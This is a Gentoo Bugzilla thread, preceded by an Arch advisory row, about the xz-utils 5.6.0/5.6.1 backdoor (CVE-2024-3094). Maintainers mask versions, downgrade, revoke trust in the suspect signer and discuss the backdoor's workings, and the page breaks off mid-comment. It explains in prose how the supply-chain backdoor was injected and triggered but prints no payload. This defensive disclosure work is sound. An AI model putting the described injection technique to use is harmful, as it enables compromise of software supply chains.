| [AVG-2851](/AVG-2851) | [xz](/package/xz) | 5.6.0-1 | 5.6.1-2 | Critical | Fixed |  |

| Date | Advisory | Group | Package | Severity | Type |
| --- | --- | --- | --- | --- | --- |
| 29 Mar 2024 | [ASA-202403-1](/ASA-202403-1) | [AVG-2851](/AVG-2851) | [xz](/package/xz) | Critical | arbitrary code execution |



=== Content from bugs.gentoo.org_978f5ed3_20250111_034011.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 928134
=app-arch/xz-utils-5.6.0, =app-arch/xz-utils-5.6.1: backdoor in release tarballs
Last modified: 2024-06-29 14:16:44 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=928134&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=928134&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 928134**](show_bug.cgi?id=928134)
(CVE-2024-3094)
- =app-arch/xz-utils-5.6.0, =app-arch/xz-utils-5.6.1: backdoor in release tarballs

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
=app-arch/xz-utils-5.6.0, =app-arch/xz-utils-5.6.1: backdoor in release tarballs

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2024-3094 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Security | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Vulnerabilities ([show other bugs](buglist.cgi?component=Vulnerabilities&product=Gentoo%20Security&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Highest blocker | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Security | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | [https://www.openwall.com/lists/oss-se...](https://www.openwall.com/lists/oss-security/2024/03/29/4) | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | A0 [glsa+] | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") | PMASKED | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2024-03-29 16:13 UTC by Sam James | | --- | --- | | Modified: | 2024-06-29 14:16 UTC ([History](show_activity.cgi?id=928134)) | | CC List: | 109 users (show)  89q1r14hd 92645417d9e5c763259dbebc306e3e adborden ahudson.news alarig alex alexander anders.gentoo ave axl base-system bertrand bgo-7187AEA9-brand bhewer bitlord0xff bjh-gentoobt bog bugs burcheri.massimo+bugs-gentoo burnsmellfactory calestyo can.ecodo.nu.n.o+bugs.gentoo carlphilippreh chewi chiitoo chris christian chutzpah cJ-gentoo concord conikost csfore d daniel david.cherednik david.goudou eschwartz Etrnls firefly\_dude0k flaviocamilo flexx flow fogti fturco gabravier gentoo-bugs gentoo-bugzilla gentoo.2019 gentoo gentoo gentoo gentoo\_bugs\_2\_peep genzilla hanno hjckr hlein hydrapolic i jasmin+gentoo javran.c jbowler jeff.gazso jeff.hayes87 jj jmerchant jorge+git julien kfm konstantinos.smanis kripton krismanmathers kumba kuraga333 leho luke5083 luke mackal.cook Manfred.Knick mario.haustein Martin.Jansa mayoi mmk moralapostel mschiff m\_gentoobug nex+b-g-o noloader nowa ole+gentoo orzel pacho pageexec peter.volkov powerman-asdf rdalek1967 revamps.warbler-0w sebastien.picavet smp srcshelton steffen t-mo tanekliang tokoyami tom ulm vamp898-gentoo xman00 ykonotopov zagazaw2004 | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") | * <https://github.com/tukaani-project/xz/issues/92> * [928146](show_bug.cgi?id=928146 "IN_PROGRESS - <app-arch/libarchive-3.7.2-r3: possible error reporting terminal injection vulnerability in tar handling") * <https://github.com/tukaani-project/xz/issues/103> | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [Add an attachment](attachment.cgi?bugid=928134&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=928134&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 16:13:00 UTC  ``` See <https://www.openwall.com/lists/oss-security/2024/03/29/4>.  "" [...] == Compromised Release Tarball ==  One portion of the backdoor is *solely in the distributed tarballs*. For easier reference, here's a link to debian's import of the tarball, but it is also present in the tarballs for 5.6.0 and 5.6.1:  <https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>  That line is *not* in the upstream source of build-to-host, nor is build-to-host used by xz in git.  However, it is present in the tarballs released upstream, except for the "source code" links, which I think github generates directly from the repository contents:  <https://github.com/tukaani-project/xz/releases/tag/v5.6.0> <https://github.com/tukaani-project/xz/releases/tag/v5.6.1>   This injects an obfuscated script to be executed at the end of configure. This script is fairly obfuscated and data from "test" .xz files in the repository.   This script is executed and, if some preconditions match, modifies $builddir/src/liblzma/Makefile to contain [...] """ ```  [Comment 1](#c1)  Larry the Git Cow   gentoo-dev  2024-03-29 16:15:07 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=e12c7ce6dab9f016b3efdd0a774793865c486b8c>  commit e12c7ce6dab9f016b3efdd0a774793865c486b8c Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-03-29 16:14:28 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-03-29 16:14:53 +0000      profiles: add references to xz-utils mask          See <https://www.openwall.com/lists/oss-security/2024/03/29/4>.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   profiles/package.mask | 4 +++-  1 file changed, 3 insertions(+), 1 deletion(-) ```  [Comment 2](#c2)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 16:16:14 UTC  ``` We have it masked since yesterday, after Debian, suse, fedora, et. al all did the same:  commit 6424767d42b1853c6e24b1cf0734d5a51d0e2e4d Author: Sam James <sam@gentoo.org> Date:   Thu Mar 28 22:00:41 2024 +0000      profiles: mask >=app-arch/xz-utils-5.6.0      A serious bug is being investigated. Please downgrade ASAP until we have a fix.      Signed-off-by: Sam James <sam@gentoo.org> ```  [Comment 3](#c3)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 17:55:46 UTC  ``` As a summary so far: * We had the (nominally) vulnerable versions in Gentoo. They were masked last night. * The posted injection script appears to not fire on Gentoo as it looks for .deb and .rpm specific files/environment variables in the build environment, but it's possible (I haven't yet verified) tht other versions had a different set of criteria. * In Gentoo, we don't patch net-misc/openssh with systemd-notify support which means liblzma, at least in the normal case, doesn't get loaded into the sshd process. * The backdoor which is injected by the script during the build process MAY OR MAY NOT only work on sshd, it's unclear (people report it checks argv[0] but no in-depth analysis has been done yet or at least shared publicly; it's possible it activates on other binaries). ```  [Comment 4](#c4)  mayoi    2024-03-29 20:24:48 UTC  ``` After migrating to profile 23.0 last week, when updating @world, my terminal lit up with lzma flag in green on a like a dozen packages. I don't want to point fingers but I think it's worth checking why that was done and who did it, because my system worked without lzma in things like kmod for years.  And this is especially bitter because I read that profile 23.0 is supposed to be "enhanced in security". I don't see how linking liblzma into everything enhances security. ```  [Comment 5](#c5)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 20:40:02 UTC  ``` (In reply to mayoi from [comment #4](show_bug.cgi?id=928134#c4)) > After migrating to profile 23.0 last week, when updating @world, my terminal > lit up with lzma flag in green on a like a dozen packages. I don't want to > point fingers but I think it's worth checking why that was done and who did > it, because my system worked without lzma in things like kmod for years. >   That's completely unrelated. We just changed defaults because lots of stuff uses lzma and zstd support.  It was done a while ago after discussion on IRC:  commit 99a7cb9e0b1728ca75242ddfee6357dc008bd1cd Author: Andreas K. Hüttel <dilfridge@gentoo.org> Date:   Sun Nov 13 19:26:40 2022 +0100      profiles: Set USE="xz zstd" in 23.0      Signed-off-by: Andreas K. Hüttel <dilfridge@gentoo.org>  I have ABSOLUTELY NO REASON to believe this was malicious at all, and I think it's unhelpful to go down that route.  > And this is especially bitter because I read that profile 23.0 is supposed > to be "enhanced in security". I don't see how linking liblzma into > everything enhances security.  Well, if we really want to get into that, we can talk about how BIND_NOW sort of made things interesting for the exploit in question. But let's try to keep this bug focused on facts please. There's already a lot of confusino out there. ```  [Comment 6](#c6)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 20:40:25 UTC  ``` (That said, I totally appreciate your point, I agree it's very unfortunate timing, I just don't think it was malicious at all, and I didn't oppose the change.) ```  [Comment 7](#c7)  revamps.warbler-0w    2024-03-29 20:43:09 UTC  ``` Since the malicious party appears to be the upstream developer with the signing key, are we assuming any changes made by them to the (unmasked) previous releases will conflict with the manifest? Assuming those hypothetical malicious changes were not already present when the manifest was generated, of course. ```  [Comment 8](#c8)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 21:03:35 UTC  ``` (In reply to revamps.warbler-0w from [comment #7](show_bug.cgi?id=928134#c7)) > Since the malicious party appears to be the upstream developer with the > signing key, are we assuming any changes made by them to the (unmasked) > previous releases will conflict with the manifest?   Yes, you can safely assume this. I've also seen no evidence of tarballs being modified post-upload.  I am still considering whether we should bring back the last release signed by Lasse Collin, rather than Jia Tan, to be safe.  > Assuming those > hypothetical malicious changes were not already present when the manifest > was generated, of course.  Yeah, this is the big challenge. ```  [Comment 9](#c9)  Hans de Graaff   gentoo-dev Security  2024-03-29 21:08:22 UTC  ``` A note about the whiteboard status: we currently believe, as per sam's summary, that the likelyhood of an impact on Gentoo is small, and that would lead to something like an A4 severity level.  However, with the backdoor not fully analyzed yet we want to take into account that the impact may be larger, and thus opt for a A0 severity, assuming a (currently unclear) worst case scenario where the backdoor could still be included and may act with root privileges. This severity also matches with the overall news about this vulnerability. ```  [Comment 10](#c10)  Nowa Ammerlaan   gentoo-dev  2024-03-29 21:12:13 UTC  ``` Since the exact scope of this is not 100% clear yet, two points we might want to consider: 1) The 'modules-compress' flag on gentoo-kernel(-bin) and external kernel modules uses xz-utils for compression. Would it be a good idea for users to recompile gentoo-kernel(-bin) after downgrading xz-utils if they have this flag enabled? Just to be on the safe side, or is this overkill? 2) (stable masked) generic-initramfs/generic-uki on gentoo-kernel(-bin) includes files from xz-utils. Do we want to rebuild these with an older version of xz-utils? ```  [Comment 11](#c11)  revamps.warbler-0w    2024-03-29 21:14:06 UTC  ``` (In reply to Sam James from [comment #8](show_bug.cgi?id=928134#c8)) > (In reply to revamps.warbler-0w from [comment #7](show_bug.cgi?id=928134#c7)) > >  > I am still considering whether we should bring back the last release signed > by Lasse Collin, rather than Jia Tan, to be safe. >  > > Assuming those > > hypothetical malicious changes were not already present when the manifest > > was generated, of course. >  > Yeah, this is the big challenge.  This seems to me to be the only responsible option, pending a thorough review, considering what I’ve seen about them pushing distros to update to the compromised version. If you don’t trust them you can’t trust what they’ve signed, can you? ```  [Comment 12](#c12)  David Sardari    2024-03-29 21:29:12 UTC  ``` fyi, stage3-amd64-hardened-systemd-20240324T164906Z.tar.xz comes with the affected xz-utils version ```  [Comment 13](#c13)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-29 21:31:38 UTC  ``` (In reply to revamps.warbler-0w from [comment #11](show_bug.cgi?id=928134#c11)) > This seems to me to be the only responsible option, pending a thorough > review, considering what I’ve seen about them pushing distros to update to > the compromised version. If you don’t trust them you can’t trust what > they’ve signed, can you?  Yes, there's just issues with whether any packages use versioned symbols from >=5.4.  I have done initial checks of 5.4..5.6 but not enough. 5.2..5.4 is harder.  But yes, if we can't trust them, we can't trust them.. ```  [Comment 14](#c14)  Larry the Git Cow   gentoo-dev  2024-03-29 21:53:24 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/data/glsa.git/commit/?id=ad7cf37eb216318a2076f79b7aceee6389bc887b>  commit ad7cf37eb216318a2076f79b7aceee6389bc887b Author:     GLSAMaker <glsamaker@gentoo.org> AuthorDate: 2024-03-29 21:48:56 +0000 Commit:     Hans de Graaff <graaff@gentoo.org> CommitDate: 2024-03-29 21:53:10 +0000      [ GLSA 202403-04 ] XZ utils: Backdoor in release tarballs          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: GLSAMaker <glsamaker@gentoo.org>     Signed-off-by: Hans de Graaff <graaff@gentoo.org>   glsa-202403-04.xml | 47 +++++++++++++++++++++++++++++++++++++++++++++++  1 file changed, 47 insertions(+) ```  [Comment 15](#c15)  Niklāvs Koļesņikovs    2024-03-29 22:28:47 UTC  ``` +1 to going back to a release with a signature that we can trust more, even if not by much. At least provided it's not too painful to do so.  Additionally it might be prudent to consider LD_BIND_NOT=1 in the default environment, since from my understanding it only affects performance but not compatibility (other than with the backdoor). Especially on systems that have not yet been downgraded and (soft-)rebooted.  Additionally do we *really* need +extra-filters IUSE on xz-utils? Those BCJ coders in particular have been making me uncomfortable me for years ever since I learned about them.  Finally, it's probably a good idea to consider patching libarchive with <https://github.com/libarchive/libarchive/commit/6110e9c82d8ba830c3440f36b990483ceaaea52c> ASAP, since it should be addressing a suspect change by the same persona.  I'm sure this APT will keep on giving us more gifts, so happy holidays, I guess. ;) ```  [Comment 16](#c16)  Larry the Git Cow   gentoo-dev  2024-03-29 22:56:26 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=56f0bb584949a4b8946dd5e79e0398e73aaf06e0>  commit 56f0bb584949a4b8946dd5e79e0398e73aaf06e0 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-03-29 22:45:41 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-03-29 22:52:30 +0000      app-arch/xz-utils: add/restore 5.4.2          This is the last release signed by Lasse Collin, the previous signer of xz-utils     releases.          Downgrade to this out of an abundance of caution. We are not aware of any issues     that *specifically* require this.          Note that the Manifest matches dfcc1f271fa3da8b8710c80737e85a7347f16ba0 from     when 5.4.2 was removed from ::gentoo in the past.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   app-arch/xz-utils/Manifest              |   2 +  app-arch/xz-utils/xz-utils-5.4.2.ebuild | 140 ++++++++++++++++++++++++++++++++  profiles/package.mask                   |  11 ++-  3 files changed, 152 insertions(+), 1 deletion(-) ```  [Comment 17](#c17)  revamps.warbler-0w    2024-03-30 01:29:46 UTC  ``` Github has disabled the XZ repository entirely as of 1:29 AM UTC ```  [Comment 18](#c18)  Alex Efros    2024-03-30 06:13:25 UTC  ``` Attempt to downgrade it while doing usual `emerge -uDN world` hangs at:  >>> Installing (1 of 6) app-arch/xz-utils-5.4.2::gentoo  * checking 191 files for package collisions   # tail /var/log/portage/app-arch:xz-utils-5.4.2:20240330-060915.log  * Final size of build directory: 14528 KiB (14.1 MiB)  * Final size of installed tree:   1424 KiB ( 1.3 MiB)  strip: x86_64-pc-linux-gnu-strip --strip-unneeded -N __gentoo_check_ldflags__ -R .comment -R .GCC.command.line -R .note.gnu.gold-version    /usr/lib64/liblzma.so.5.4.2    /usr/bin/xzdec    /usr/bin/lzmadec    /usr/bin/xz    /usr/bin/lzmainfo  * checking 191 files for package collisions ```  [Comment 19](#c19)  Alex Efros    2024-03-30 06:18:22 UTC  ``` (In reply to Alex Efros from [comment #18](show_bug.cgi?id=928134#c18)) > Attempt to downgrade it while doing usual `emerge -uDN world` hangs at:  Sorry, this wasn't related to portage, I suppose it hangs because Keybase hangs and portage probably has tried to get access to /keybase or something like that. Killing keybase-redirector process has solved the issue. ```  [Comment 20](#c20)  Vasilis Lourdas    2024-03-30 08:09:51 UTC  ``` I see that all versions above (and including) 5.4.6-r1 have been masked and this is the correct action to take. However, I see that other distros revert back to 5.4.6, is this version also infected with this backdoor? ```  [Comment 21](#c21)  Alexander Tsoy    2024-03-30 08:19:34 UTC  ``` (In reply to Vasilis Lourdas from [comment #20](show_bug.cgi?id=928134#c20)) > I see that all versions above (and including) 5.4.6-r1 have been masked and > this is the correct action to take. However, I see that other distros revert > back to 5.4.6, is this version also infected with this backdoor?  In short: this is unknown. See the explanation in the profiles/package.mask and in the commit message [1].  [1] <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=56f0bb584949a4b8946dd5e79e0398e73aaf06e0> ```  [Comment 22](#c22)  Jeffrey Walton    2024-03-30 16:30:17 UTC  ``` Lasse Collin provided a statement at <<https://tukaani.org/xz-backdoor/>>. ```  [Comment 23](#c23)  Sébastien P.    2024-03-30 16:31:59 UTC  ``` (In reply to Larry the Git Cow from [comment #16](show_bug.cgi?id=928134#c16)) > commit 56f0bb584949a4b8946dd5e79e0398e73aaf06e0 > Author:     Sam James <sam@gentoo.org> > AuthorDate: 2024-03-29 22:45:41 +0000 > Commit:     Sam James <sam@gentoo.org> > CommitDate: 2024-03-29 22:52:30 +0000 >  >     app-arch/xz-utils: add/restore 5.4.2 >      >     This is the last release signed by Lasse Collin, the previous signer of > xz-utils >     releases.  Hi,  Is it really the latest version signed by Lasse Collin? Tag is from Jia Tan: <https://git.tukaani.org/?p=xz.git;a=tag;h=073fbd9a994f2e934f3eb3ecf5109041c24f6f24> Latest tag of Lasse Collin is: <https://git.tukaani.org/?p=xz.git;a=tag;h=f52502e78bf84f516a739e8d8a1357f27eeea75f>  Some people try also to downgrade to an early version (without any commit of Jia Tan): <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024#45> ```  [Comment 24](#c24)  Jeffrey Walton    2024-03-30 16:42:10 UTC  ``` (In reply to Sébastien P. from [comment #23](show_bug.cgi?id=928134#c23)) > (In reply to Larry the Git Cow from [comment #16](show_bug.cgi?id=928134#c16)) > > commit 56f0bb584949a4b8946dd5e79e0398e73aaf06e0 > > Author:     Sam James <sam@gentoo.org> > > AuthorDate: 2024-03-29 22:45:41 +0000 > > Commit:     Sam James <sam@gentoo.org> > > CommitDate: 2024-03-29 22:52:30 +0000 > >  > >     app-arch/xz-utils: add/restore 5.4.2 > >      > >     This is the last release signed by Lasse Collin, the previous signer of > > xz-utils > >     releases. >  > Is it really the latest version signed by Lasse Collin? > Tag is from Jia Tan: > <https://git.tukaani.org/?p=xz.git;a=tag>; > h=073fbd9a994f2e934f3eb3ecf5109041c24f6f24 > Latest tag of Lasse Collin is: > <https://git.tukaani.org/?p=xz.git;a=tag>; > h=f52502e78bf84f516a739e8d8a1357f27eeea75f >  > Some people try also to downgrade to an early version (without any commit of > Jia Tan): <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024#45>  According to Debian at <<https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024#5>>:  <QUOTE> I count a minimum of 750 commits or contributions to xz by Jia Tan, who backdoored it.  This includes all 700 commits made after they merged a pull request in Jan 7 2023, at which point they appear to have already had direct push access, which would have also let them push commits with forged authors. Probably a number of other commits before that point as well.  Reverting the backdoored version to a previous version is not sufficient to know that Jia Tan has not hidden other backdoors in it. Version 5.4.5 still contains the majority of those commits.  Commits by them such as 18d7facd3802b55c287581405c4d49c98708c136  and ae5c07b22a6b3766b84f409f1b6b5c100469068a show that they were deep into analyzing the security of xz. They were well placed to insert a buffer overflow that could allow eg, a targeted xz file to cause arbitrary code execution. The impact of such a security hole could be much more stealthy and bad than the known backdoor since it would allow chaining xz with other unrelated software releases on an ongoing basis.  The package should be reverted to a version before their involvement, which started with commit 6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4. Or their early commits vetted and revert to a later point, but any arbitrary  commit by a known bad and malicious actor almost certainly has less value than the risk that a subtle change go unnoticed.  I'd suggest reverting to 5.3.1. Bearing in mind that there were security fixes after that point for ZDI-CAN-16587 that would need to be reapplied. </QUOTE> ```  [Comment 25](#c25)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-30 16:47:29 UTC  ``` (In reply to Sébastien P. from [comment #23](show_bug.cgi?id=928134#c23))  The ebuild verifies it using Lasse Collin's key with USE=verify-sig, even. ```  [Comment 26](#c26)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-30 16:47:52 UTC  ``` (In reply to Jeffrey Walton from [comment #24](show_bug.cgi?id=928134#c24))  5.3.1 would not be suitable to downgrade to, as it was a development release. xz-utils does odd/even for dev/stable. It would have to be 5.2.x. ```  [Comment 27](#c27)  Sébastien P.    2024-03-30 17:03:39 UTC  ``` (In reply to Sam James from [comment #25](show_bug.cgi?id=928134#c25)) > (In reply to Sébastien P. from [comment #23](show_bug.cgi?id=928134#c23)) >  > The ebuild verifies it using Lasse Collin's key with USE=verify-sig, even.  Ok.  About verify-sig, I saw that Jia Tan one is still on portage: <https://gitweb.gentoo.org/repo/gentoo.git/tree/sec-keys/openpgp-keys-jiatan>  It should be removed/masked since it can not be trusted anymore. ```  [Comment 28](#c28)  Sébastien P.    2024-03-30 17:10:25 UTC  ``` Only masked packages depend on this key anyway:  # grep -r openpgp-keys-jiatan /usr/portage/**/*.ebuild /usr/portage/app-arch/xz-utils/xz-utils-5.4.6-r1.ebuild:        BDEPEND+=" verify-sig? ( sec-keys/openpgp-keys-jiatan )" /usr/portage/app-arch/xz-utils/xz-utils-5.6.1.ebuild:   BDEPEND+=" verify-sig? ( sec-keys/openpgp-keys-jiatan )" /usr/portage/app-arch/xz-utils/xz-utils-9999.ebuild:    BDEPEND+=" verify-sig? ( sec-keys/openpgp-keys-jiatan )" ```  [Comment 29](#c29)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-30 17:18:13 UTC  ``` Yeah, that's why I haven't been in a hurry to do anything about it there, but I should add it to the mask at least. ```  [Comment 30](#c30)  Larry the Git Cow   gentoo-dev  2024-03-30 19:42:56 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=c5494a3efcce376157635fb368ab0d9a5b7e7090>  commit c5494a3efcce376157635fb368ab0d9a5b7e7090 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-03-30 19:38:13 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-03-30 19:41:45 +0000      profiles: mask sec-keys/openpgp-keys-jiatan too (essentially a noop though)          Mask sec-keys/openpgp-keys-jiatan too just out of completeness, but this     is really a noop given all packages using it were already masked.          Two people have independently suggested it to me so may as well do it.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   profiles/package.mask | 1 +  1 file changed, 1 insertion(+) ```  [Comment 31](#c31)  Jeffrey Walton    2024-03-30 20:02:41 UTC  ``` It looks like more analysis has revealed this is a RCE with the payload in the modulus of a public key: "The payload is extracted from the N value (the public key) passed to RSA_public_decrypt, checked against a simple fingerprint, and decrypted with a fixed ChaCha20 key before the Ed448 signature verification..." Also see <<https://www.openwall.com/lists/oss-security/2024/03/30/36>>. ```  [Comment 32](#c32)  Spencer    2024-03-30 20:27:20 UTC  ``` Is there information currently on the scope of the backdoor? We know it attacked sshd as that was how it was discovered, but would this have any impact on something like zstd (another [de]compression program) which can be complied with USE +lzma? The linux kernel itself with CONFIG_XZ_DEC? ```  [Comment 33](#c33)  Michael Cook    2024-03-30 21:16:46 UTC  ``` (In reply to Spencer from [comment #32](show_bug.cgi?id=928134#c32)) > Is there information currently on the scope of the backdoor? We know it > attacked sshd as that was how it was discovered, but would this have any > impact on something like zstd (another [de]compression program) which can be > complied with USE +lzma? The linux kernel itself with CONFIG_XZ_DEC?  Someone decrypted the strings in the payload (<https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01>) only mentions sshd. I would assume we would see more stuff like that if it was affecting others. ```  [Comment 34](#c34)  Larry the Git Cow   gentoo-dev  2024-03-30 21:48:47 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=29d5f89b75c1ab37b3346ac41840cf8fa4b3d3a8>  commit 29d5f89b75c1ab37b3346ac41840cf8fa4b3d3a8 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-03-30 21:47:35 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-03-30 21:48:39 +0000      app-arch/xz-utils: drop 5.6.1 (noop really)          On IRC, it was pointed out that non-Gentoo users might get confused if they     see Gentoo has 5.6.1 in its repository even though it is masked.          Let's just drop it to avoid confusion. It's better to do that than risk someone     being confused - there's enough confusion out there anyway.          In a minute, I'll probably adjust the live ebuild to delete the known bad     test data too.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   app-arch/xz-utils/Manifest              |   2 -  app-arch/xz-utils/xz-utils-5.6.1.ebuild | 141 --------------------------------  2 files changed, 143 deletions(-) ```  [Comment 35](#c35)  Larry the Git Cow   gentoo-dev  2024-03-30 21:52:31 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=efe06b01128ce829eb4e4c6a5ed5f52a342ecbc0>  commit efe06b01128ce829eb4e4c6a5ed5f52a342ecbc0 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-03-30 21:51:33 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-03-30 21:51:52 +0000      app-arch/xz-utils: delete known-bad test files in 9999          As I promised to do in 29d5f89b75c1ab37b3346ac41840cf8fa4b3d3a8 a moment     ago. I really doubt many people are rocking 9999 and there's nothing known-bad     in the git repo *that can use these* but the test files are dangerous anyway     so let's just do it for completeness.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   app-arch/xz-utils/xz-utils-9999.ebuild | 3 +++  1 file changed, 3 insertions(+) ```  [Comment 36](#c36)  Sébastien P.    2024-03-30 22:25:37 UTC  ``` (In reply to Larry the Git Cow from [comment #34](show_bug.cgi?id=928134#c34)) >     On IRC, it was pointed out that non-Gentoo users might get confused if > they >     see Gentoo has 5.6.1 in its repository even though it is masked.  I got a similar confusion with Debian: <https://packages.debian.org/sid/xz-utils> => 5.6.1+really5.4.5-1 First, I saw 5.6.1 and did not pay attention to the next part…  I also saw that Alpine stay with 5.6.1 and just switch from release to git archives: <https://git.alpinelinux.org/aports/commit/main/xz/APKBUILD?id=982d2c6bcbbb579e85bb27c40be84072ca0b1fd9>  Like ou say: “there's enough confusion out there anyway” :). In that case, it is important to look at security alert of your distro. Because each one can handle it in different ways. ```  [Comment 37](#c37)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-03-30 22:31:16 UTC  ``` I'm maintaining <https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27> as a FAQ. ```  [Comment 38](#c38)  Alexander Wessel    2024-03-30 22:42:18 UTC  ``` (In reply to Spencer from [comment #32](show_bug.cgi?id=928134#c32)) > Is there information currently on the scope of the backdoor?   It is a RCE (remote code execution) backdoor, where sshd is used as the first step: It listens for connections, and when so patched, invokes the malignant liblzma, which in turn executes a stage 2 that finally executes the payload which is provided to sshd in a part of the encrypted public key given to it as the credential (wich doesn't need to be authentic to be harmful).  > would this have any impact on something like 